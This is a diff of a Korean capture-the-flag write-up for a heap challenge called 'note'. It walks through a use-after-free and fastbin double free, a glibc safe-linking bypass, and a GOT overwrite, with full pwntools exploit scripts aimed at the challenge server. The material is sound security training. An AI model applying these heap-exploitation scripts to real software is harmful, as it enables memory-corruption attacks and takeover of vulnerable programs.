@@ -1,4 +1,4 @@
-!\[image.png](/assets/img/dh5note/image1.png)
+![image.png](/assets/img/dh5note/image1.png)
 
 
 
@@ -18,35 +18,35 @@ GOT overwrite 가능
 
 
 
-!\[image.png](/assets/img/dh5note/image2.png)
+![image.png](/assets/img/dh5note/image2.png)
 
 
 
 ```c
 
-struct note notes\[10];
+struct note notes[10];
 
 ```
 
 
 
-!\[image.png](/assets/img/dh5note/image3.png)
+![image.png](/assets/img/dh5note/image3.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image4.png)
+![image.png](/assets/img/dh5note/image4.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image5.png)
+![image.png](/assets/img/dh5note/image5.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image6.png)
+![image.png](/assets/img/dh5note/image6.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image7.png)
+![image.png](/assets/img/dh5note/image7.png)
 
 ---
 
@@ -56,11 +56,11 @@ struct note notes\[10];
 
 
 
-\- idx (0~9) 노트 선택
+- idx (0~9) 노트 선택
 
-\- size 0~0x70, calloc 청크 할당
+- size 0~0x70, calloc 청크 할당
 
-\- data 해당 청크에 size만큼 입력
+- data 해당 청크에 size만큼 입력
 
 
 
@@ -68,9 +68,9 @@ struct note notes\[10];
 
 
 
-\- idx (0~9) 노트 선택
+- idx (0~9) 노트 선택
 
-\- print 해당 노트 data 출력
+- print 해당 노트 data 출력
 
 
 
@@ -78,9 +78,9 @@ struct note notes\[10];
 
 
 
-\- idx (0~9) 노트 선택
+- idx (0~9) 노트 선택
 
-\- data 해당 청크에 size만큼 다시 입력
+- data 해당 청크에 size만큼 다시 입력
 
 
 
@@ -88,9 +88,9 @@ struct note notes\[10];
 
 
 
-\- idx (0~9) 노트 선택
+- idx (0~9) 노트 선택
 
-\- data가 가리키는 청크 free()
+- data가 가리키는 청크 free()
 
 
 
@@ -98,7 +98,7 @@ struct note notes\[10];
 
 
 
-!\[image.png](/assets/img/dh5note/image8.png)
+![image.png](/assets/img/dh5note/image8.png)
 
 
 
@@ -114,11 +114,11 @@ Dangling Pointer를 가리키고 있는 노트를 2번 메뉴를 통해 출력�
 
 
 
-!\[image.png](/assets/img/dh5note/image9.png)
+![image.png](/assets/img/dh5note/image9.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image10.png)
+![image.png](/assets/img/dh5note/image10.png)
 
 
 
@@ -130,11 +130,11 @@ safe link 우회하는 코드
 
 
 
-https://github.com/shellphish/how2heap/blob/master/glibc\_2.32/decrypt\_safe\_linking.c
+https://github.com/shellphish/how2heap/blob/master/glibc_2.32/decrypt_safe_linking.c
 
 
 
-!\[image.png](/assets/img/dh5note/image11.png)
+![image.png](/assets/img/dh5note/image11.png)
 
 
 
@@ -154,7 +154,7 @@ def decrypt(cipher):
 
 &nbsp;   for i in range(1, 6):
 
-&nbsp;       bits = 64-12\*i
+&nbsp;       bits = 64-12*i
 
 &nbsp;       if bits < 0:
 
@@ -172,11 +172,11 @@ def decrypt(cipher):
 
 
 
-!\[image.png](/assets/img/dh5note/image12.png)
+![image.png](/assets/img/dh5note/image12.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image13.png)
+![image.png](/assets/img/dh5note/image13.png)
 
 
 
@@ -190,15 +190,15 @@ heap 영역 leak 성공
 
 ```python
 
-from pwn import \*
+from pwn import *
 
 
 
-\#p = remote("host8.dreamhack.games", 24028)
+#p = remote("host8.dreamhack.games", 24028)
 
 p = remote('localhost', 31337)
 
-\#p = process('./note')
+#p = process('./note')
 
 elf = ELF("./note")
 
@@ -216,7 +216,7 @@ def create(idx, size, data):
 
 
 
-def read\_note(idx):
+def read_note(idx):
 
 &nbsp;   p.sendline(b'2')
 
@@ -258,7 +258,7 @@ def decrypt(cipher):
 
 &nbsp;   for i in range(1, 6):
 
-&nbsp;       bits = 64-12\*i
+&nbsp;       bits = 64-12*i
 
 &nbsp;       if bits < 0:
 
@@ -274,7 +274,7 @@ def decrypt(cipher):
 
 
 
-for \_ in range(7):
+for _ in range(7):
 
 &nbsp;   create(9, 0x30, b'a')
 
@@ -282,15 +282,15 @@ for \_ in range(7):
 
 
 
-leak = read\_note(9)
+leak = read_note(9)
 
-cipher = u64(leak.ljust(8, b'\\x00'))
+cipher = u64(leak.ljust(8, b'\x00'))
 
 print('leak : ', hex(cipher))
 
-decrypted\_leak = decrypt(cipher)
+decrypted_leak = decrypt(cipher)
 
-print('decrypted\_leak : ', hex(decrypted\_leak))
+print('decrypted_leak : ', hex(decrypted_leak))
 
 
 
@@ -306,7 +306,7 @@ p.interactive()
 
 
 
-!\[image.png](/assets/img/dh5note/image14.png)
+![image.png](/assets/img/dh5note/image14.png)
 
 
 
@@ -318,11 +318,11 @@ p.interactive()
 
 
 
-!\[image.png](/assets/img/dh5note/image15.png)
+![image.png](/assets/img/dh5note/image15.png)
 
 
 
-!\[image.png](/assets/img/dh5note/image16.png)
+![image.png](/assets/img/dh5note/image16.png)
 
 
 
@@ -370,37 +370,37 @@ fastbin의 특성상 중복된 주소가 리스트에 두 번 들어가게 되�
 
 typedef struct {
 
-&nbsp;   size\_t size;
+&nbsp;   size_t size;
 
-&nbsp;   char \*data;
+&nbsp;   char *data;
 
 } Note;
 
 
 
-note notes\[10];  // .bss: 0x4040A8 시작
+note notes[10];  // .bss: 0x4040A8 시작
 
 ```
 
 
 
-notes\[7]를 예시로 들면 notes\[7]의 시작 주소는 
+notes[7]를 예시로 들면 notes[7]의 시작 주소는 
 
 
 
-0x4040A8 + (16 \*7) = 0x404110 이다.
+0x4040A8 + (16 *7) = 0x404110 이다.
 
 
 
-구조체 notes\[7]는 다음과 같이 메모리에 배치된다.
+구조체 notes[7]는 다음과 같이 메모리에 배치된다.
 
 
 
 ```
 
-0x404110: notes\[7].size
+0x404110: notes[7].size
 
-0x404118: notes\[7].data ← heap 어딘가를 가리킴
+0x404118: notes[7].data ← heap 어딘가를 가리킴
 
 ```
 
@@ -422,11 +422,11 @@ create가 가지는 의미는 다음과 같다.
 
 
 
-1\. malloc(0x70)
+1. malloc(0x70)
 
-2\. notes\[7].data = 0x12f72a0
+2. notes[7].data = 0x12f72a0
 
-3\. memcpy(notes\[7].data, b'AAAA', 4) → 해당 힙 영역(0x12f72a0)에 데이터(AAAA)를 복사
+3. memcpy(notes[7].data, b'AAAA', 4) → 해당 힙 영역(0x12f72a0)에 데이터(AAAA)를 복사
 
 
 
@@ -436,7 +436,7 @@ create가 가지는 의미는 다음과 같다.
 
 ```c
 
-\*(notes\[7].data) = b'AAAA'
+*(notes[7].data) = b'AAAA'
 
 ```
 
@@ -448,7 +448,7 @@ create가 가지는 의미는 다음과 같다.
 
 ```c
 
-notes\[7].data = AAAA
+notes[7].data = AAAA
 
 ```
 
@@ -468,7 +468,7 @@ notes\[7].data = AAAA
 
 ```c
 
-notes\[7].data = elf.got\['exit']
+notes[7].data = elf.got['exit']
 
 ```
 
@@ -492,7 +492,7 @@ notes\[7].data = elf.got\['exit']
 
 ```python
 
-create(7, 0x60, p64(elf.got\['exit']))
+create(7, 0x60, p64(elf.got['exit']))
 
 ```
 
@@ -504,7 +504,7 @@ create(7, 0x60, p64(elf.got\['exit']))
 
 ```c
 
-\*(notes\[7].data) = elf.got\['exit']  // 포인터가 가리키는 곳의 값 덮기
+*(notes[7].data) = elf.got['exit']  // 포인터가 가리키는 곳의 값 덮기
 
 ```
 
@@ -522,7 +522,7 @@ create(7, 0x60, p64(elf.got\['exit']))
 
 
 
-이후 malloc()으로 해당 구조체의 data 포인터 위치에 접근하게 되면,  notes\[7].data = elf.got\['exit']처럼 포인터를 덮어쓸 수 있게 된다.
+이후 malloc()으로 해당 구조체의 data 포인터 위치에 접근하게 되면,  notes[7].data = elf.got['exit']처럼 포인터를 덮어쓸 수 있게 된다.
 
 
 
@@ -542,17 +542,17 @@ delete(0); # A double free 발생!
 
 
 
-이러면 fastbin freelist는 다음과 같이 된다 : fastbin\[0x70] = A → B → A
+이러면 fastbin freelist는 다음과 같이 된다 : fastbin[0x70] = A → B → A
 
 
 
-이후 오염된 A의 fd를 fake\_chunk 주소로 조작한다.
+이후 오염된 A의 fd를 fake_chunk 주소로 조작한다.
 
 
 
 ```python
 
-create(0, 0x60, p64(fake\_chunk\_addr ^ (heap\_leak >> 12)))
+create(0, 0x60, p64(fake_chunk_addr ^ (heap_leak >> 12)))
 
 ```
 
@@ -562,11 +562,11 @@ glibc 2.30+부터는 safe-linking이 적용돼 있어서
 
 
 
-fd = fake\_addr ^ (heap\_base >> 12) 이어야 bypass 가능하다.
+fd = fake_addr ^ (heap_base >> 12) 이어야 bypass 가능하다.
 
 
 
-3번 할당하게 되면 fake\_chunk에 malloc을 반환하도록 유도
+3번 할당하게 되면 fake_chunk에 malloc을 반환하도록 유도
 
 
 
@@ -576,7 +576,7 @@ create(1, 0x60, b'b')  # B
 
 create(2, 0x60, b'a')  # A again
 
-create(3, 0x60, p64(elf.got\['exit']))  # fake\_chunk에 malloc 됨
+create(3, 0x60, p64(elf.got['exit']))  # fake_chunk에 malloc 됨
 
 ```
 
@@ -586,11 +586,11 @@ create(3, 0x60, p64(elf.got\['exit']))  # fake\_chunk에 malloc 됨
 
 
 
-즉, notes\[7].data = exit@GOT
+즉, notes[7].data = exit@GOT
 
 
 
-!\[image.png](/assets/img/dh5note/image17.png)
+![image.png](/assets/img/dh5note/image17.png)
 
 
 
@@ -602,21 +602,21 @@ update를 통해 7번 위치의 data에 0x401256 함수를 넣으면 익스 성�
 
 
 
-\### exploit.py
+### exploit.py
 
 
 
 ```python
 
-from pwn import \*
+from pwn import *
 
 
 
 p = remote("host8.dreamhack.games", 19728)
 
-\#p = remote('localhost', 31337)
+#p = remote('localhost', 31337)
 
-\#p = process('./note')
+#p = process('./note')
 
 elf = ELF("./note")
 
@@ -634,7 +634,7 @@ def create(idx, size, data):
 
 
 
-def read\_note(idx):
+def read_note(idx):
 
 &nbsp;   p.sendline(b'2')
 
@@ -676,7 +676,7 @@ def decrypt(cipher):
 
 &nbsp;   for i in range(1, 6):
 
-&nbsp;       bits = 64-12\*i
+&nbsp;       bits = 64-12*i
 
 &nbsp;       if bits < 0:
 
@@ -696,7 +696,7 @@ create(7, 0x70, b'a')
 
 
 
-for \_ in range(7):
+for _ in range(7):
 
 &nbsp;   create(9, 0x60, b'a')
 
@@ -712,31 +712,31 @@ create(1, 0x60, b'b')
 
 delete(0)
 
-\# fastbin: A -> NULL
+# fastbin: A -> NULL
 
 
 
 delete(1)
 
-\# fastbin: B -> A -> NULL
+# fastbin: B -> A -> NULL
 
 
 
 delete(0)
 
-\# fastbin: A -> B -> A 
+# fastbin: A -> B -> A 
 
 
 
-leak = read\_note(9)
+leak = read_note(9)
 
-cipher = u64(leak.ljust(8, b'\\x00'))
+cipher = u64(leak.ljust(8, b'\x00'))
 
 print('leak : ', hex(cipher))
 
-decrypted\_leak = decrypt(cipher)
+decrypted_leak = decrypt(cipher)
 
-print('decrypt : ', hex(decrypted\_leak))
+print('decrypt : ', hex(decrypted_leak))
 
 
 
@@ -744,11 +744,11 @@ pause()
 
 
 
-fake\_chunk\_addr = 0x404110  # notes\[7]
+fake_chunk_addr = 0x404110  # notes[7]
 
 
 
-create(0, 0x60, p64(fake\_chunk\_addr ^ ((decrypted\_leak >> 12))))  # A
+create(0, 0x60, p64(fake_chunk_addr ^ ((decrypted_leak >> 12))))  # A
 
 
 
@@ -756,11 +756,11 @@ create(1, 0x60, b'b')  # B
 
 
 
-create(2, 0x60, b'a')  # A dup, malloc 리턴값 = notes\[7]
+create(2, 0x60, b'a')  # A dup, malloc 리턴값 = notes[7]
 
 
 
-create(3, 0x60, p64(elf.got\['exit'])) # notes\[7].ptr = exit@GOT
+create(3, 0x60, p64(elf.got['exit'])) # notes[7].ptr = exit@GOT
 
 
 
@@ -780,7 +780,7 @@ p.interactive()
 
 
 
-!\[image.png](/assets/img/dh5note/image18.png)
+![image.png](/assets/img/dh5note/image18.png)
 
 
 
@@ -792,7 +792,7 @@ p.interactive()
 
 
 
-!\[image.png](/assets/img/dh5note/image19.png)
+![image.png](/assets/img/dh5note/image19.png)
 
 
 
@@ -800,7 +800,7 @@ shfit+f12
 
 
 
-!\[image.png](/assets/img/dh5note/image20.png)
+![image.png](/assets/img/dh5note/image20.png)
 
 
 
@@ -816,7 +816,7 @@ create(idx, 0x30, ~~) 를 하면
 
 
 
-실제로는 size=0x40 청크가 생성되고, 이건 fastbin\[2]에 들어감
+실제로는 size=0x40 청크가 생성되고, 이건 fastbin[2]에 들어감
 
 
 
